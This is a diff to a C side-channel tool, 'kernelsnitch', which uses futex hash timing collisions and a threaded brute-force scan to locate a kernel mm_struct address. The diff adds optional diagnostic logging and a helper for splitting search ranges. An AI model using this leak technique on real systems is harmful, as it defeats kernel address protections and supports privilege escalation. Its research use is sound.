@@ -78,6 +78,10 @@ struct kernelsnitch_shared_state {
     enum kernelsnitch_state state;
 
     int mte_enabled;
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    int diagnostic_attempt;
+#endif
 };
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
@@ -198,12 +202,36 @@ struct range {
 struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    size_t *diagnostic_counts;
+#endif
 };
+
+static struct range mm_leak_range_for_thread(
+    struct kernelsnitch_shared_state *ks, size_t id)
+{
+    struct range range;
+
+    range.id = id;
+    range.start = IDENTITY_START + ks->identity_diff * id;
+    range.end = IDENTITY_START + ks->identity_diff * (id + 1);
+    if ((range.start % COARSE_SZ) != 0)
+        range.start &= ~(COARSE_SZ - 1);
+    if ((range.end % COARSE_SZ) != 0)
+        range.end = (range.end & ~(COARSE_SZ - 1)) + COARSE_SZ;
+    return range;
+}
+
 static void *__mm_leak(void *arg)
 {
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
     struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
     struct range *range = &mm_leak_arg->range;
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    size_t candidates_tested = 0;
+#endif
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
@@ -211,6 +239,10 @@ static void *__mm_leak(void *arg)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+                candidates_tested++;
+#endif
 
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
@@ -242,6 +274,11 @@ static void *__mm_leak(void *arg)
             }
         }
     }
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    if (mm_leak_arg->diagnostic_counts)
+        mm_leak_arg->diagnostic_counts[range->id] = candidates_tested;
+#endif
     free(mm_leak_arg);
     return 0;
 }
@@ -333,6 +370,11 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    size_t selected_sample_times[ks->collisions];
+    size_t selected_probe_indices[ks->collisions];
+#endif
 
     size_t approx_time = MIN(
         __measure(ks, (size_t)&ks->futexes[0]),
@@ -355,6 +397,11 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             count++;
             ks->futex_addrs[count] = futex_addr;
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+            selected_sample_times[count] = ks->times[i];
+            selected_probe_indices[count] = i;
+#endif
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
         }
     }
@@ -366,6 +413,24 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
         ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
     }
     __decrease(ks);
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    int collision_detail = ks->diagnostic_attempt <= 4 ||
+        (ks->diagnostic_attempt % 16) == 0 || wanted == count;
+    pr_info("mmcollect collision-summary attempt=%d ready=%d selected=%zu/%zu baseline=%zu threshold=%zu hashsize=%lu repeats=%zu average=%zu target=%016zx\n",
+            ks->diagnostic_attempt, wanted == count, count, wanted,
+            approx_time, approx_time * KERNELSNITCH_THRESHOLD_MULT,
+            futex_hashsize, ks->repeat_measurement, ks->average,
+            (size_t)ks->futex_addrs[0]);
+    if (collision_detail) {
+        for (size_t sample = 1; sample <= count; sample++)
+            pr_info("mmcollect collision-key attempt=%d index=%zu probe=%zu address=%016zx measure=%zu\n",
+                    ks->diagnostic_attempt, sample,
+                    selected_probe_indices[sample],
+                    (size_t)ks->futex_addrs[sample],
+                    selected_sample_times[sample]);
+    }
+#endif
 }
 size_t kernelsnitch_found_collisions(struct kernelsnitch_shared_state *ks)
 {
@@ -382,22 +447,63 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
     if (ks->verbose) pr_info("start bruteforcing\n");
     reset_cpu_pin();
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    size_t *diagnostic_counts = calloc(ks->thread_cnt,
+                                       sizeof(*diagnostic_counts));
+#endif
 
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
         mm_leak_arg->ks = ks;
-        mm_leak_arg->range.id = i;
-        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
-        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
-        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
-            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
-        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
-            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+        mm_leak_arg->range = mm_leak_range_for_thread(ks, i);
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+        mm_leak_arg->diagnostic_counts = diagnostic_counts;
+#endif
         SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
         pthread_join(ks->tids[i], 0);
     ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+#if defined(RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE) && \
+    RMG_DIAG_CONTROLLED_MM_TRACE_ACTIVE
+    if (diagnostic_counts) {
+        size_t total = 0;
+        size_t minimum = SIZE_MAX;
+        size_t maximum = 0;
+        for (size_t i = 0; i < ks->thread_cnt; i++) {
+            size_t scanned = diagnostic_counts[i];
+            total += scanned;
+            if (scanned < minimum)
+                minimum = scanned;
+            if (scanned > maximum)
+                maximum = scanned;
+        }
+        pr_info("mmcollect search-summary attempt=%d found=%d mm=%016zx identity=[%016zx,%016zx) diff=%zu threads=%zu slab_bytes=%zu stride=%zu candidates=%zu min_per_thread=%zu max_per_thread=%zu\n",
+                ks->diagnostic_attempt,
+                ks->state == KERNELSNITCH_MM_FOUND,
+                (size_t)ks->mm_struct, (size_t)IDENTITY_START,
+                (size_t)IDENTITY_END, ks->identity_diff, ks->thread_cnt,
+                (size_t)(KS_PAGE_SIZE << ks->mm_slab_order),
+                ks->mm_struct_sz, total, minimum, maximum);
+        int range_detail = ks->diagnostic_attempt <= 4 ||
+            (ks->diagnostic_attempt % 16) == 0 ||
+            ks->state == KERNELSNITCH_MM_FOUND;
+        if (range_detail) {
+            for (size_t i = 0; i < ks->thread_cnt; i++) {
+                struct range range = mm_leak_range_for_thread(ks, i);
+                pr_info("mmcollect search-range attempt=%d worker=%zu range=[%016zx,%016zx) candidates=%zu\n",
+                        ks->diagnostic_attempt, i, range.start, range.end,
+                        diagnostic_counts[i]);
+            }
+        }
+        free(diagnostic_counts);
+    } else {
+        pr_warning("mmcollect search-summary attempt=%d candidate-counts=unavailable\n",
+                   ks->diagnostic_attempt);
+    }
+#endif
 }
 
 /**
